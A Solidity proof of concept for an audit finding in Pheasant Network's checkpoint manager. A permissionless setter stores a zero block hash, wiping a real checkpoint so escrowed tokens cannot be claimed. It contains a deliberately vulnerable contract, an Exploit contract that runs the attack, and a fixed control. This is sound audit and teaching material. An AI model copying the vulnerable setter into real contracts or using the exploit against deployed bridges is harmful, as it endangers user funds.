// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Pheasant Network — OptimismChildCheckpointManager stores a zero block hash
    (Quantstamp / Danny Aksenov, finding #60332).

    SYNTHETIC, one chain, cheatcode-free. optimismSendBlockInfo is permissionless
    and _processMessageFromRoot does not reject bytes32(0). A later zero write
    wipes a real checkpoint, so a proof that would have released N pays 0.
    Control rejects the zero hash and the same proof pays N. */

contract Token {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        require(allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract ChildCheckpoint {
    uint256 public constant BLOCK_NO = 42;

    Token public token;
    mapping(uint256 => bytes32) public blockHashs;
    uint256 public writes;

    constructor(Token _token) {
        token = _token;
    }

    function optimismSendBlockInfo(uint256 blockNumber, bytes32 blockHash) external {
        blockHashs[blockNumber] = blockHash;
        // @> VULN: a zero hash was just stored; both the real hash and zero are accepted
        writes += 1;
    }

    function deposit(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
    }

    function claim(bytes32 proofHash) external returns (uint256 paid) {
        bytes32 stored = blockHashs[BLOCK_NO];
        if (stored == bytes32(0) || stored != proofHash) return 0;
        paid = token.balanceOf(address(this));
        if (paid != 0) token.transfer(msg.sender, paid);
    }
}

contract Exploit {
    uint256 public constant N = 250 ether;

    Token public token;
    ChildCheckpoint public child;
    uint256 public paid;
    uint256 public stuck;
    bytes32 public realHash;

    constructor() {
        token = new Token("Bridge USD", "bUSD", 18);
        child = new ChildCheckpoint(token);
        realHash = keccak256("pheasant-block-42");
    }

    function run() external {
        token.mint(address(this), N);
        token.approve(address(child), N);
        child.deposit(N);
        child.optimismSendBlockInfo(42, realHash);
        child.optimismSendBlockInfo(42, bytes32(0));
        paid = child.claim(realHash);
        stuck = token.balanceOf(address(child));
        require(paid == 0, "proof still paid");
        require(stuck == N, "escrow was released");
        require(child.writes() == 2, "writes");
    }
}

/// @dev Control: _processMessageFromRoot rejects a zero block hash.
contract ChildFixed {
    uint256 public constant BLOCK_NO = 42;

    Token public token;
    mapping(uint256 => bytes32) public blockHashs;

    constructor(Token _token) {
        token = _token;
    }

    function optimismSendBlockInfo(uint256 blockNumber, bytes32 blockHash) external {
        require(blockHash != bytes32(0), "zero hash");
        blockHashs[blockNumber] = blockHash;
    }

    function deposit(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
    }

    function claim(bytes32 proofHash) external returns (uint256 paid) {
        require(blockHashs[BLOCK_NO] == proofHash, "proof");
        paid = token.balanceOf(address(this));
        if (paid != 0) token.transfer(msg.sender, paid);
    }
}
